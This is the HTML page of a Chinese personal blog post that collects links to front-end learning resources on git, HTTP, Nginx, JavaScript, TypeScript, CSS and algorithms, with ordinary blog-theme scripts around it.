<!DOCTYPE html>
<html>

<head>
  <meta charset="UTF-8" />

<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
<meta name="keywords" content="css">
<meta name="description" content="">
<meta name="theme-color" content="#000">
<title>3-navigation-1-前端教程 | 当下</title>
<link rel="shortcut icon" href="/favicon.ico?v=1664100337521">
<link rel="stylesheet" href="/media/css/gemini.css">
<link rel="stylesheet" href="/media/fonts/font-awesome.css">
<link
  href="//fonts.googleapis.com/css?family=Monda:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|Rosario:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext"
  rel="stylesheet" type="text/css">

<link href="/media/hljs/styles/default.css"
  rel="stylesheet">

<link rel="stylesheet" href="/styles/main.css">
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

<script src="/media/js/jquery.js"></script>
<script src="/media/hljs/highlight.js"></script>
<script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.0/velocity.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.0/velocity.ui.min.js"></script>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/katex.min.css"
  integrity="sha384-zB1R0rpPzHqg7Kpt0Aljp8JPLqbXI3bhnPWROx27a9N0Ll6ZP/+DiW/UqRcLbRjq" crossorigin="anonymous">


<script defer src="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/katex.min.js"
  integrity="sha384-y23I5Q6l+B6vatafAwxRu/0oK/79VlbSz7Q9aiSZUvyWYIYsd+qj+o24G5ZU2zJz" crossorigin="anonymous"></script>
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/contrib/auto-render.min.js"
  integrity="sha384-kWPLUVMOks5AQFrykwIup5lo0m3iMkkHrD0uJ4H5cjeGihAutqP0yW0J6dpFiVkI" crossorigin="anonymous"
  onload="renderMathInElement(document.body);"></script>






  <meta name="description" content="3-navigation-1-前端教程" />
  <meta name="keywords" content="navigation" />
</head>

<body>
  <div class="head-top-line"></div>
  <div class="header-box">
    
<div class="gemini">
  <header class="header  ">
    <div class="blog-header box-shadow-wrapper bg-color " id="header">
      <div class="nav-toggle" id="nav_toggle">
        <div class="toggle-box">
          <div class="line line-top"></div>
          <div class="line line-center"></div>
          <div class="line line-bottom"></div>
        </div>
      </div>
      <div class="site-meta">       
        <div class="site-title">
          
            <a href="/" class="brand">
              <span>当下</span>
            </a>  
          
        </div>
        
          <p class="subtitle">平心静气，奋勇向前</p>
        
      </div>
      <nav class="site-nav" id="site_nav">
        <ul id="nav_ul">
          
            
            
            <li class="nav-item ">
              
              
                <a href="/" target="_self">
                  <i class="fa fa-home"></i> 首页
                </a>
              
            </li>
          
            
            
            <li class="nav-item ">
              
              
                <a href="/archives/" target="_self">
                  <i class="fa fa-archive"></i> 归档
                </a>
              
            </li>
          
            
            
            <li class="nav-item ">
              
              
                <a href="/tags/" target="_self">
                  <i class="fa fa-tags"></i> 标签
                </a>
              
            </li>
          
          
          
            <li id="fa_search" class="nav-item">
              <a href="javascript:void(0);">
                <i class="fa fa-search"></i> <span class="language" data-lan="search">搜索</span>
              </a>
            </li>
          
        </ul>
      </nav>
    </div>
  </header>
</div>

<script type="text/javascript"> 
 
  let showNav = true;

  let navToggle = document.querySelector('#nav_toggle'),
  siteNav = document.querySelector('#site_nav');
  
  function navClick() {
    let sideBar = document.querySelector('.sidebar');
    let navUl = document.querySelector('#nav_ul');
    navToggle.classList.toggle('nav-toggle-active');
    siteNav.classList.toggle('nav-menu-active');
    if (siteNav.classList.contains('nav-menu-active')) {
      siteNav.style = "height: " + (navUl.children.length * 42) +"px !important";
    } else {
      siteNav.style = "";
    }
  }

  navToggle.addEventListener('click',navClick);  
</script>
  </div>
  <div class="main-continer">
    
    <div
      class="section-layout gemini ">
      <div class="section-layout-wrapper">
        

<div class="sidebar">
  
    <div class="sidebar-box box-shadow-wrapper bg-color right-motion" id="sidebar">
      
        <div class="post-list-sidebar">
          <div class="sidebar-title">
            <span id="tocSideBar" class="sidebar-title-item sidebar-title-active language" data-lan="index">文章目录</span>
            <span id="metaSideBar" class="sidebar-title-item language" data-lan="preview">站点概览</span>
          </div>
        </div>
      
      <div class="sidebar-body gemini" id="sidebar_body">
        
          
            <div class="post-side-meta" id="post_side_meta">
              
<div class="sidebar-wrapper box-shadow-wrapper bg-color">
  <div class="sidebar-item">
    <img class="site-author-image right-motion" src="/images/avatar.png"/>
    <p class="site-author-name">lee</p>
    
  </div>
  <div class="sidebar-item side-item-stat right-motion">
    <div class="sidebar-item-box">
      <a href="/archives/">
        
        <span class="site-item-stat-count">128</span>
        <span class="site-item-stat-name language" data-lan="article">文章</span>
      </a>
    </div>
    <div class="sidebar-item-box">
      <a href="">
        <span class="site-item-stat-count">12</span>
        <span class="site-item-stat-name language" data-lan="category">分类</span>
      </a>
    </div>
    <div class="sidebar-item-box">
      <a href="/tags/">
        <span class="site-item-stat-count">12</span>
        <span class="site-item-stat-name language" data-lan="tag">标签</span>
      </a>
    </div>
  </div>
  
    
  
  

  



</div>
            </div>
            <div class="post-toc sidebar-body-active" id="post_toc" style="opacity: 1;">
              <div class="toc-box right-motion">
  <div class="toc-wrapper auto-number auto"
    id="toc_wrapper">
    <ul class="markdownIt-TOC">
<li>
<ul>
<li><a href="#git">git</a></li>
<li><a href="#http">HTTP</a></li>
<li><a href="#nginx">Nginx</a></li>
<li><a href="#javascript">JavaScript</a></li>
<li><a href="#es6">ES6+</a></li>
<li><a href="#typescript">TypeScript</a></li>
<li><a href="#css">Css</a></li>
<li><a href="#algorithm">algorithm</a></li>
</ul>
</li>
</ul>

  </div>
</div>

<script>

  let lastTop = 0, lList = [], hList = [], postBody, lastIndex = -1;
  let active = 'active-show', activeClass = 'active-current';
  let tocWrapper = document.querySelector('#toc_wrapper');
  let tocContent = tocWrapper.children[0];
  let autoNumber = tocWrapper && tocWrapper.classList.contains('auto-number');

  function addTocNumber(elem, deep) {
    if (!elem) {
      return;
    }
    let prop = elem.__proto__;

    if (prop === HTMLUListElement.prototype) {
      for (let i = 0; i < elem.children.length; i++) {
        addTocNumber(elem.children[i], deep + (i + 1) + '.');
      }
    } else if (prop === HTMLLIElement.prototype) {
      // 保存li元素
      if (elem.children[0] && elem.children[0].__proto__ === HTMLAnchorElement.prototype) {
        lList.push(elem);
      }
      for (let i = 0; i < elem.children.length; i++) {
        let cur = elem.children[i];
        if (cur.__proto__ === HTMLAnchorElement.prototype) {
          if (autoNumber) {
            cur.text = deep + ' ' + cur.text;
          }
        } else if (cur.__proto__ === HTMLUListElement.prototype) {
          addTocNumber(cur, deep);
        }
      }
    }
  }

  function removeParentActiveClass() {
    let parents = tocContent.querySelectorAll('.' + active)
    parents.forEach(function (elem) {
      elem.classList.remove(active);
    });
  }

  function addActiveClass(index) {
    if (index >= 0 && index < hList.length) {
      lList[index].classList.add(activeClass);
    }
  }

  function removeActiveClass(index) {
    if (index >= 0 && index < hList.length) {
      lList[index].classList.remove(activeClass);
    }
  }

  function addActiveLiElemment(elem, parent) {
    if (!elem || elem === parent) {
      return;
    } else {
      if (elem.__proto__ === HTMLLIElement.prototype) {
        elem.classList.add(active);
      }
      addActiveLiElemment(elem.parentElement, parent);
    }
  }

  function showToc() {
    if (tocWrapper) {
      postBody = document.querySelector('#post_body');
      for (let i = 0; i < postBody.children.length; i++) {
        if (postBody.children[i].__proto__ === HTMLHeadingElement.prototype) {
          hList.push(postBody.children[i]);
        }
      }
      if (tocWrapper.classList.contains('compress')) {
        tocContent.classList.add('closed');
      } else if (tocWrapper.classList.contains('no_compress')) {
        tocContent.classList.add('expanded');
      } else {
        if (hList.length > 10) {
          active = 'active-hidden'
          tocContent.classList.add('closed');
        } else {
          tocContent.classList.add('expanded');
        }
      }
    }
  }

  (function () {
    // 处理不是从#一级标题开始目录
    if (tocContent.children.length === 1 && tocContent.children[0].__proto__ === HTMLLIElement.prototype) {
      let con = tocContent.children[0].children[0];
      tocContent.innerHTML = con.innerHTML;
    }
    let markdownItTOC = document.querySelector('.markdownIt-TOC');
    let innerHeight = window.innerHeight;
    markdownItTOC.style = `max-height: ${innerHeight - 80 > 0 ? innerHeight - 80 : innerHeight}px`
    addTocNumber(tocContent, '');
  })();

  document.addEventListener('scroll', function (e) {
    if (lList.length <= 0) {
      return;
    }
    let scrollTop = document.scrollingElement.scrollTop + 10;
    let dir;

    if (lastTop - scrollTop > 0) {
      dir = 'up';
    } else {
      dir = 'down';
    }

    lastTop = scrollTop;
    if (scrollTop <= 0) {
      if (lastIndex >= 0 && lastIndex < hList.length) {
        lList[lastIndex].classList.remove(activeClass);
      }
      return;
    }

    let current = 0, hasFind = false;
    for (let i = 0; i < hList.length; i++) {
      if (hList[i].offsetTop > scrollTop) {
        current = i;
        hasFind = true;
        break;
      }
    }
    if (!hasFind && scrollTop > lList[lList.length - 1].offsetTop) {
      current = hList.length - 1;
    } else {
      current--;
    }
    if (dir === 'down') {
      if (current > lastIndex) {
        addActiveClass(current);
        removeActiveClass(lastIndex)
        lastIndex = current;
        removeParentActiveClass();
        lList[current] && addActiveLiElemment(lList[current].parentElement, tocContent);
      }
    } else {
      if (current < lastIndex) {
        addActiveClass(current);
        removeActiveClass(lastIndex);
        lastIndex = current;
        removeParentActiveClass();
        lList[current] && addActiveLiElemment(lList[current].parentElement, tocContent);
      }
    }
  });


  window.addEventListener('load', function () {
    showToc();
    document.querySelector('#sidebar').style = 'display: block;';
    tocWrapper.classList.add('toc-active');
    setTimeout(function () {
      if ("createEvent" in document) {
        let evt = document.createEvent("HTMLEvents");
        evt.initEvent("scroll", false, true);
        document.dispatchEvent(evt);
      }
      else {
        document.fireEvent("scroll");
      }
    }, 500)
  })

</script>
            </div>
          
        
      </div>
    </div>
  
</div>
<script>
  const SIDEBAR_TITLE_ACTIVE = 'sidebar-title-active';
  const SIDEBAR_BODY_ACTIVE = 'sidebar-body-active';
  const SLIDE_UP_IN = 'slide-up-in';

  let sidebar = document.querySelector('#sidebar'),
  tocSideBar = document.querySelector('#tocSideBar'),
  metaSideBar = document.querySelector('#metaSideBar'),
  postToc = document.querySelector('#post_toc'),
  postSiteMeta = document.querySelector('#post_side_meta'),
  sidebarTitle = document.querySelector('.sidebar-title'),
  sidebarBody = document.querySelector('#sidebar_body');

  tocSideBar && tocSideBar.addEventListener('click', (e) => {
    toggleSidebar(e);
  });

  metaSideBar && metaSideBar.addEventListener('click', (e) => {
    toggleSidebar(e);
  });

  function toggleSidebar(e) {
    let currentTitle = document.querySelector("."+SIDEBAR_TITLE_ACTIVE);
    if (currentTitle == e.srcElement) {
      return ;
    }
    let current, showElement, hideElement;
    if (e.srcElement == metaSideBar) {
      showElement = postSiteMeta;
      hideElement = postToc;
    } else if (e.srcElement == tocSideBar){
      showElement = postToc;
      hideElement = postSiteMeta;
    }
    currentTitle.classList.remove(SIDEBAR_TITLE_ACTIVE);
    e.srcElement.classList.add(SIDEBAR_TITLE_ACTIVE);

    jQuery.Velocity(hideElement, 'stop');
    jQuery.Velocity(hideElement, 'transition.slideUpOut', {
      display: 'none',
      duration: 200,
      complete: function () {
        jQuery.Velocity(showElement, 'transition.slideDownIn', {
          duration: 200
        });
      }
    })
    hideElement.classList.remove(SIDEBAR_BODY_ACTIVE);
    showElement.classList.add(SIDEBAR_BODY_ACTIVE);
  }

  postToc && postToc.addEventListener('transitionend', function() {
    this.classList.remove(SLIDE_UP_IN);
  });

  if (sidebarBody) {
    if (sidebarBody.classList.contains('pisces') || sidebarBody.classList.contains('gemini')) {
      let hasFix = false;
      let scrollEl = document.querySelector('.main-continer');
      let limitTop = document.querySelector('#nav_ul').children.length * 42 + 162;
      window.addEventListener('scroll', function(e) {
        if (document.scrollingElement.scrollTop >= limitTop) {
          if (!hasFix) {
            sidebar.classList.add('sidebar-fixed');
            hasFix = true;
          }
        } else {
          if (hasFix) {
            sidebar.classList.remove('sidebar-fixed');
            hasFix = false;
          }
        }
      });
    }
  }
  
</script>
        <div class="section-box box-shadow-wrapper">
          <div class="section bg-color post post-page">
            <section class="post-header">
  <h1 class="post-title">
    <a class="post-title-link" href="https://leecss.com/post/qian-duan-jiao-cheng-dao-hang/">
      3-navigation-1-前端教程
    </a>
  </h1>
  <div class="post-meta">
    
    <span class="meta-item pc-show">
      <i class="fa fa-calendar-o"></i>
      <span class="language" data-lan="publish">发布于</span>
      <span class="publish-time" data-t="2021-06-16 07:08:43">2021-06-16</span>
      <span class="post-meta-divider pc-show">|</span>
    </span>
    
    <span class="meta-item">
      <i class="fa fa-folder-o"></i>
      <span class="pc-show language" data-lan="category-in">分类于</span>
      
      
      <a href="https://leecss.com/tag/lhRvYHDQU/">
        <span>navigation</span>
      </a>
      
      
    </span>
    <span class="post-meta-divider">|</span>
    
    <span class="meta-item">
      <i class="fa fa-clock-o"></i>
      <span>2<span class="language" data-lan="minute">分钟</span></span>
    </span>
    <span class="meta-item">
      <span class="post-meta-divider">|</span>
      <i class="fa fa-file-word-o"></i>
      <span>315<span class="pc-show language" data-lan="words">字数</span></span>
    </span>
    
  </div>
</section>
            <div class="post-body next-md-body" id="post_body">
              <h2 id="git">git</h2>
<p>1、<a href="https://learngitbranching.js.org/?locale=zh_CN">游戏化教程</a></p>
<p>2、<a href="https://www.bookstack.cn/read/git-tutorial/README.md">阮一峰</a></p>
<p>​      <a href="http://www.ruanyifeng.com/blog/2014/06/git_remote.html">阮一峰blog1</a></p>
<p>​      <a href="http://www.ruanyifeng.com/blog/2015/12/git-cheat-sheet.html">阮一峰blog2</a></p>
<p>3、<a href="https://www.zsythink.net/">朱双印</a></p>
<p>4、<a href="https://www.lzane.com/tech/git-internal/">李泽帆</a></p>
<p>5、<a href="https://dev.to/lydiahallie/cs-visualized-useful-git-commands-37p1">Lydia Hallie</a></p>
<p>6、<a href="https://marklodato.github.io/visual-git-guide/index-zh-cn.html">图解git</a></p>
<p>7、<a href="https://www.liaoxuefeng.com/wiki/896043488029600">廖雪峰</a></p>
<p>8、<a href="http://www.worldhello.net/gotgit/">蒋鑫-git权威指南</a></p>
<p>​      <a href="http://www.worldhello.net/gotgithub/">蒋鑫-gotgithub</a></p>
<p>9、<a href="https://www.jianshu.com/nb/49854893">简书-繁华似锦Fighting</a></p>
<p>10、<a href="https://git-scm.com/book/zh/v2">git文档</a></p>
<p>11、<a href="https://docs.github.com/en">github文档</a></p>
<h2 id="http">HTTP</h2>
<p>书籍：图解HTTP、HTTP权威指南</p>
<p>1、<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP">MDN-HTTP</a></p>
<p>2、<a href="https://juejin.cn/post/6844903844216832007">图解HTTP整理-前端基础篇之HTTP协议</a></p>
<p>3、<a href="https://juejin.cn/post/6844903586703343624">图解HTTP整理-来一场轰轰烈烈的HTTP协议扫盲革命</a></p>
<p>4、<a href="https://www.runoob.com/http/http-tutorial.html">菜鸟教程-HTTP</a></p>
<p>​      <a href="https://www.runoob.com/ajax/ajax-tutorial.html">菜鸟教程-AJAX</a></p>
<p>5、<a href="https://www.tutorialspoint.com/http/http_header_fields.htm">http-tutorial</a></p>
<p>​      <a href="https://www.tutorialspoint.com/ajax/index.htm">ajax-tutorial</a></p>
<h2 id="nginx">Nginx</h2>
<p>1、<a href="https://juejin.cn/post/6844903793918738440">前端开发者必备的Nginx知识</a></p>
<h2 id="javascript">JavaScript</h2>
<p>书籍：JavaScript高级程序设计</p>
<p><a href="https://github.com/rwaldron/idiomatic.js">JavaScript 编码原则-英文版</a></p>
<p><a href="https://github.com/rwaldron/idiomatic.js/tree/master/translations/zh_CN">JavaScript 编码原则-中文版</a></p>
<p><a href="https://airbnb.io/javascript/">JavaScript 规范指南</a></p>
<p><a href="https://github.com/airbnb/javascript">JavaScript 规范指南-英文版</a></p>
<p><a href="https://github.com/lin-123/javascript">JavaScript 规范指南-中文版</a></p>
<p><a href="https://github.com/ryanmcdermott/clean-code-javascript">JavaScript-代码整洁之道-英文版</a></p>
<p><a href="https://github.com/alivebao/clean-code-js">JavaScript-代码整洁之道-中文版</a></p>
<p>1、<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript">MDN-JavaScript</a></p>
<p>2、<a href="https://zh.javascript.info/">现代JavaScript教程</a></p>
<p>3、<a href="https://wangdoc.com/javascript/">JavaScript 教程</a></p>
<p>​      <a href="https://javascript.ruanyifeng.com/">JavaScript 标准参考教程</a></p>
<p>4、<a href="http://bonsaiden.github.io/JavaScript-Garden/zh/">JavaScript秘密花园</a></p>
<h2 id="es6">ES6+</h2>
<p>1、<a href="https://wangdoc.com/es6/">ES6 入门教程</a></p>
<p>​      <a href="https://es6.ruanyifeng.com/">ES6 入门教程</a></p>
<h2 id="typescript">TypeScript</h2>
<p><a href="https://ts.xcatliu.com/">TypeScript 入门教程</a></p>
<h2 id="css">Css</h2>
<p><a href="https://cssguidelin.es/">通用 CSS 笔记、建议与指导-英文版</a></p>
<p><a href="https://github.com/chadluo/CSS-Guidelines/blob/master/README.md">通用 CSS 笔记、建议与指导-中文版</a></p>
<p>1、<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS">MDN-CSS</a></p>
<h2 id="algorithm">algorithm</h2>
<p>1、<a href="https://visualgo.net/zh">https://visualgo.net/zh</a></p>
<p>2、<a href="https://leetcode-cn.com/">力扣</a></p>
<p>3、<a href="https://leetcode-solution-leetcode-pp.gitbook.io/leetcode-solution/">力扣加加</a></p>
<p>4、<a href="http://www.conardli.top/docs/">awesome-coding-js</a></p>
<p>5、<a href="https://programmercarl.com/">代码随想录</a></p>
<p>6、<a href="https://github.com/MisterBooo/LeetCodeAnimation">动画版解题</a></p>

            </div>
            
            
              <div class="post-footer">
  <ul class="post-copyright">
    <li class="post-copyright-author">
      <strong class="language" data-lan="author">本文作者：</strong>
      lee
    </li>
    <li class="post-copyright-link">
      <strong class="language" data-lan="link">本文链接：</strong>
      <a href="https://leecss.com/post/qian-duan-jiao-cheng-dao-hang/" title="3-navigation-1-前端教程">https://leecss.com/post/qian-duan-jiao-cheng-dao-hang/</a>
    </li>
    <li class="post-copyright-license">
      <strong class="language" data-lan="copyright">版权声明： </strong>
      本博客所有文章除特别声明外，均采用<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i> BY-NC-SA</a> 许可协议。转载请注明出处！
    </li>
  </ul>
  <div class="tags">
    
      <a href="https://leecss.com/tag/lhRvYHDQU/"># navigation</a>
    
  </div>
  <div class="nav">
    <div class="nav-prev">
      
        <i class="fa fa-chevron-left"></i>
        <a class="nav-pc-next" title="4-navigation-2-开发资源.md" href="https://leecss.com/post/cheng-xu-yuan-zi-yuan-hui-zong/">4-navigation-2-开发资源.md</a class="nav-pc-next">
        <a class="nav-mobile-prev" title="4-navigation-2-开发资源.md" href="https://leecss.com/post/cheng-xu-yuan-zi-yuan-hui-zong/">上一篇</a>
      
    </div>
    <div class="nav-next">
      
        <a class="nav-pc-next" title="2-git-1-语义化版本" href="https://leecss.com/post/git-yu-yi-hua-ban-ben/">2-git-1-语义化版本</a>
        <a class="nav-mobile-next" title="2-git-1-语义化版本" href="https://leecss.com/post/git-yu-yi-hua-ban-ben/">下一篇</a>
        <i class="fa fa-chevron-right"></i>
      
    </div>
  </div>
</div>
            
            
  <script src="https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js"></script>
<div id="vcomments" style="padding: 10px 0px 0px 0px"></div>

<style>
  .v .veditor {
    min-height: 10rem;
    background-image: url('');
    background-size: contain;
    background-repeat: no-repeat;
    background-position: right;
    background-color: rgba(255, 255, 255, 0);
    resize: none;
  }

  .v .vwrap {
    border: 1px solid #000 !important;
  }

  .v .vbtn {
    padding: .4rem 1.2rem !important;
    border-color: #fff !important;
    background-color: #49b1f5 !important;
    color: #fff !important;
    font-size: .7rem !important;
  }

  .v .vcards .vcard .vh .vmeta .vat {
    padding: 0 .8rem !important;
    border: 1px solid #00c4b6 !important;
    border-radius: 5px !important;
    color: #00c4b6 !important;
  }
</style>
<script>
  new Valine({
    el: '#vcomments',
    appId: 'EtGAaWMPMfBv4R8mHt4OVOK0-gzGzoHsz',
    appKey: 'JYHcCIGVcuAO36RXVrdt0DYM',
    avatar: '',
    placeholder: '',
    pageSize: '',
    lang: 'zh-cn',
    enableQQ: 'true' === 'false',
    visitor: 'true' === 'false',
    highlight: 'true' === 'true',
    avatarForce: 'true' === 'false',
  });
</script>

          </div>
        </div>
      </div>
    </div>
    <div class="footer-box">
  <footer class="footer">
    <span id="busuanzi_container_site_pv">浏览数 <span id="busuanzi_value_site_pv"></span> 次</span>
    <span class="post-meta-divider">|</span>
    <span id="busuanzi_container_site_uv">访客数 <span id="busuanzi_value_site_uv"></span> 人</span>
    <div class="copyright">
      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> ©2019 | Theme By <a
        href="https://github.com/hsxyhao/gridea-theme-next" target="_blank">HsxyHao</a>
    </div>
    <div class="poweredby">
      
    </div>
  </footer>
  
  
  <div class="gemini back-to-top" id="back_to_top">
    <i class="fa fa-arrow-up"></i>
    
    <span class="scrollpercent">
      <span id="back_to_top_text">0</span>%
    </span>
    
  </div>
  
  
  
<link rel="stylesheet" href="/media/live2d/css/live2d.css" />
<div class="box-scale">
  <div id="landlord" style="left: 5px;bottom: px;"
    data-key="">
    <canvas id="live2d" width="500" height="560" class="live2d"></canvas>
    

      <div class="message" style="opacity:0"></div>
      <div class="live_talk_input_body">
        <div class="live_talk_input_name_body">
          <input name="name" type="text" class="live_talk_name white_input" id="AIuserName" autocomplete="off"
            placeholder="你的名字" />
        </div>
        <div class="live_talk_input_text_body">
          <input name="talk" type="text" class="live_talk_talk white_input" id="AIuserText" autocomplete="off"
            placeholder="要和我聊什么呀？" />
          <button type="button" class="live_talk_send_btn" id="talk_send">发送</button>
        </div>
      </div>
      <input name="live_talk" id="live_talk" value="1" type="hidden" />
      <div class="live_ico_box">
        <div class="live_ico_item type_info" id="showInfoBtn"></div>
        <div class="live_ico_item type_talk" id="showTalkBtn"></div>
        
        <div class="live_ico_item type_youdu" id="youduButton"></div>
        <div class="live_ico_item type_quit" id="hideButton"></div>
        <input name="live_statu_val" id="live_statu_val" value="0" type="hidden" />
        <audio src="" style="display:none;" id="live2d_bgm" data-bgm="0" preload="none"></audio>
        <input id="duType" value="douqilai" type="hidden">
        
      </div>
    
  </div>
</div>
<div id="open_live2d">召唤看板娘</div>
<script>
  var message_Path = 'https://cdn.jsdelivr.net/gh/hsxyhao/live2d.github.io@master/';
  let landlord = document.querySelector('#landlord');
  var apiKey = landlord.dataset.key;
</script>
<script type="text/javascript" src="/media/live2d/js/live2d.js"></script>
<script>
	var home_Path = document.location.protocol + '//' + window.document.location.hostname + ":" + window.document.location.port + '/';
	var userAgent = window.navigator.userAgent.toLowerCase();
	var norunAI = ["android", "iphone", "ipod", "ipad", "windows phone", "mqqbrowser", "msie", "trident/7.0"];
	var norunFlag = false;

	for (var i = 0; i < norunAI.length; i++) {
		if (userAgent.indexOf(norunAI[i]) > -1) {
			norunFlag = true;
			break;
		}
	}

	if (!window.WebGLRenderingContext) {
		norunFlag = true;
	}

	if (!norunFlag) {
		var hitFlag = false;
		var AIFadeFlag = false;
		var liveTlakTimer = null;
		var sleepTimer_ = null;
		var AITalkFlag = false;
		var talkNum = 0;
		(function () {
			function renderTip(template, context) {
				var tokenReg = /(\\)?\{([^\{\}\\]+)(\\)?\}/g;
				return template.replace(tokenReg, function (word, slash1, token, slash2) {
					if (slash1 || slash2) {
						return word.replace('\\', '');
					}
					var variables = token.replace(/\s/g, '').split('.');
					var currentObject = context;
					var i, length, variable;
					for (i = 0, length = variables.length; i < length; ++i) {
						variable = variables[i];
						currentObject = currentObject[variable];
						if (currentObject === undefined || currentObject === null) return '';
					}
					return currentObject;
				});
			}

			String.prototype.renderTip = function (context) {
				return renderTip(this, context);
			};

			var re = /x/;
			re.toString = function () {
				showMessage('哈哈，你打开了控制台，是想要看看我的秘密吗？', 5000);
				return '';
			};

			$(document).on('copy', function () {
				showMessage('你都复制了些什么呀，转载要记得加上出处哦~~', 5000);
			});

			function initTips() {
				$.ajax({
					cache: true,
					url: message_Path + 'message.json',
					dataType: "json",
					success: function (result) {
						$.each(result.mouseover, function (index, tips) {
							$(tips.selector).mouseover(function () {
								var text = tips.text;
								if (Array.isArray(tips.text)) text = tips.text[Math.floor(Math.random() * tips.text.length + 1) - 1];
								text = text.renderTip({ text: $(this).text() });
								showMessage(text, 3000);
								talkValTimer();
								clearInterval(liveTlakTimer);
								liveTlakTimer = null;
							});
							$(tips.selector).mouseout(function () {
								showHitokoto();
								if (liveTlakTimer == null) {
									liveTlakTimer = window.setInterval(function () {
										showHitokoto();
									}, 15000);
								};
							});
						});
						$.each(result.click, function (index, tips) {
							$(tips.selector).click(function () {
								if (hitFlag) {
									return false
								}
								hitFlag = true;
								setTimeout(function () {
									hitFlag = false;
								}, 8000);
								var text = tips.text;
								if (Array.isArray(tips.text)) text = tips.text[Math.floor(Math.random() * tips.text.length + 1) - 1];
								text = text.renderTip({ text: $(this).text() });
								showMessage(text, 3000);
							});
							clearInterval(liveTlakTimer);
							liveTlakTimer = null;
							if (liveTlakTimer == null) {
								liveTlakTimer = window.setInterval(function () {
									showHitokoto();
								}, 15000);
							};
						});
					}
				});
			}
			initTips();

			var text;
			if (document.referrer !== '') {
				var referrer = document.createElement('a');
				referrer.href = document.referrer;
				text = '嗨！来自 <span style="color:#0099cc;">' + referrer.hostname + '</span> 的朋友！';
				var domain = referrer.hostname.split('.')[1];
				if (domain == 'baidu') {
					text = '嗨！ 来自 百度搜索 的朋友！<br>欢迎访问<span style="color:#0099cc;">「 ' + document.title.split(' - ')[0] + ' 」</span>';
				} else if (domain == 'so') {
					text = '嗨！ 来自 360搜索 的朋友！<br>欢迎访问<span style="color:#0099cc;">「 ' + document.title.split(' - ')[0] + ' 」</span>';
				} else if (domain == 'google') {
					text = '嗨！ 来自 谷歌搜索 的朋友！<br>欢迎访问<span style="color:#0099cc;">「 ' + document.title.split(' - ')[0] + ' 」</span>';
				}
			} else {
				if (window.location.href == home_Path) { //主页URL判断，需要斜杠结尾
					var now = (new Date()).getHours();
					if (now > 23 || now <= 5) {
						text = '你是夜猫子呀？这么晚还不睡觉，明天起的来嘛？';
					} else if (now > 5 && now <= 7) {
						text = '早上好！一日之计在于晨，美好的一天就要开始了！';
					} else if (now > 7 && now <= 11) {
						text = '上午好！工作顺利嘛，不要久坐，多起来走动走动哦！';
					} else if (now > 11 && now <= 14) {
						text = '中午了，工作了一个上午，现在是午餐时间！';
					} else if (now > 14 && now <= 17) {
						text = '午后很容易犯困呢，今天的运动目标完成了吗？';
					} else if (now > 17 && now <= 19) {
						text = '傍晚了！窗外夕阳的景色很美丽呢，最美不过夕阳红~~';
					} else if (now > 19 && now <= 21) {
						text = '晚上好，今天过得怎么样？';
					} else if (now > 21 && now <= 23) {
						text = '已经这么晚了呀，早点休息吧，晚安~~';
					} else {
						text = '嗨~ 快来逗我玩吧！';
					}
				} else {
					text = '欢迎阅读<span style="color:#0099cc;">「 ' + document.title.split(' - ')[0] + ' 」</span>';
				}
			}
			showMessage(text, 12000);
		})();

		liveTlakTimer = setInterval(function () {
			showHitokoto();
		}, 15000);

		function showHitokoto() {
			if (sessionStorage.getItem("Sleepy") !== "1") {
				if (!AITalkFlag) {
					$.getJSON('https://v1.hitokoto.cn/', function (result) {
						talkValTimer();
						showMessage(result.hitokoto, 0);
					});
				}
			} else {
				hideMessage(0);
				if (sleepTimer_ == null) {
					sleepTimer_ = setInterval(function () {
						checkSleep();
					}, 200);
				}
			}
		}

		function checkSleep() {
			var sleepStatu = sessionStorage.getItem("Sleepy");
			if (sleepStatu !== '1') {
				talkValTimer();
				showMessage('你回来啦~', 0);
				clearInterval(sleepTimer_);
				sleepTimer_ = null;
			}
		}

		function showMessage(text, timeout) {
			if (Array.isArray(text)) text = text[Math.floor(Math.random() * text.length + 1) - 1];
			$('.message').stop();
			$('.message').html(text);
			$('.message').fadeTo(200, 1);
			//if (timeout === null) timeout = 5000;
			//hideMessage(timeout);
		}
		function talkValTimer() {
			$('#live_talk').val('1');
		}

		function hideMessage(timeout) {
			//$('.message').stop().css('opacity',1);
			if (timeout === null) timeout = 5000;
			$('.message').delay(timeout).fadeTo(200, 0);
		}

		function initLive2d() {
			$('#hideButton').on('click', function () {
				if (AIFadeFlag) {
					return false;
				} else {
					AIFadeFlag = true;
					localStorage.setItem("live2dhidden", "0");
					$('#landlord').fadeOut(200);
					$('#open_live2d').delay(200).fadeIn(200);
					setTimeout(function () {
						AIFadeFlag = false;
					}, 300);
				}
			});
			$('#open_live2d').on('click', function () {
				if (AIFadeFlag) {
					return false;
				} else {
					AIFadeFlag = true;
					localStorage.setItem("live2dhidden", "1");
					$('#open_live2d').fadeOut(200);
					$('#landlord').delay(200).fadeIn(200);
					setTimeout(function () {
						AIFadeFlag = false;
					}, 300);
				}
			});
			$('#youduButton').on('click', function () {
				if ($('#youduButton').hasClass('doudong')) {
					var typeIs = $('#youduButton').attr('data-type');
					$('#youduButton').removeClass('doudong');
					$('body').removeClass(typeIs);
					$('#youduButton').attr('data-type', '');
				} else {
					var duType = $('#duType').val();
					var duArr = duType.split(",");
					var dataType = duArr[Math.floor(Math.random() * duArr.length)];

					$('#youduButton').addClass('doudong');
					$('#youduButton').attr('data-type', dataType);
					$('body').addClass(dataType);
				}
			});
			if (apiKey) {
				$('#showInfoBtn').on('click', function () {
					var live_statu = $('#live_statu_val').val();
					if (live_statu == "0") {
